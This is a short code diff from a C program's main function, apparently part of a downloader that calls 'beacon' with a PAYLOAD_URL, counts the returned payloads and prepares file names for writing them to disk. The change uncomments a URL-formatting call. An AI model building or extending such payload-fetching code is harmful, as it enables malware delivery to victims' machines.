@@ -25,11 +25,11 @@ int main(int argc, char **argv)
     int numFiles = 0;
     char currFileName[strlen(PATH_TO_WRITE) + 5];
     char *formattedURL;
-    /*
-    formattedURL = formatURL(PAYLOAD_URL);
+    
+    formattedURL = formatURL();
     if (formattedURL == NULL)
         return -1;
-    */
+    
     payload = beacon(PAYLOAD_URL);
     payloadOffset = payload.memory; // hold for iteration
     numPayloads = extractInt(payloadOffset);
